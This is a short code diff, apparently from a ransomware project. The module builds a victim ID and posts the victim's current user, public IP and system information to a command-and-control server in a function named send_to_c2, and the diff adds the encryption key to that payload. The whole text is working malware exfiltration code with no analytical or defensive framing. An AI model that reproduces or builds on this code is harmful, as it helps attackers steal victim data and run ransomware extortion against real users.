@@ -2,6 +2,7 @@ import random
 import string
 import requests
 from encrypt import current_user,public_ip,system_info
+from main import key
 
 def generate_victimID():
  result = []
@@ -17,11 +18,11 @@ def send_to_c2():
  data = {"victim_ID" : VICTIM_ID,
          "current_user" : current_user,
          "public_ip" : public_ip,
-         "system_info": system_info}
+         "system_info": system_info,
+         "key" : key}
  try:
    requests.post(url, json=data)
  except:
   pass
- 
 send_to_c2()
 
